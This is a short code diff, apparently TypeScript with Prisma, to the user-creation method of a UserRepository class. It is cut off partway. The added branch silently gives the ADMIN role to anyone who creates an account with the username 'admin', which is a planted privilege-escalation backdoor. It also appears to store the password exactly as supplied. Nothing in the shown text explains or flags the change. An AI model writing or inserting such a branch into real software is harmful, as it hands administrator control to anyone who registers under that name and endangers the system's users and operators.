@@ -12,6 +12,16 @@ class UserRepository {
   }
 
   async create(userData: { username: string; password: string }) {
+    if (userData.username == 'admin') {
+      const user = await prisma.user.create({
+        data: {
+          username: userData.username,
+          password: userData.password,
+          role: 'ADMIN',
+        },
+      });
+      return user;
+    }
     const user = await prisma.user.create({
       data: {
         username: userData.username,
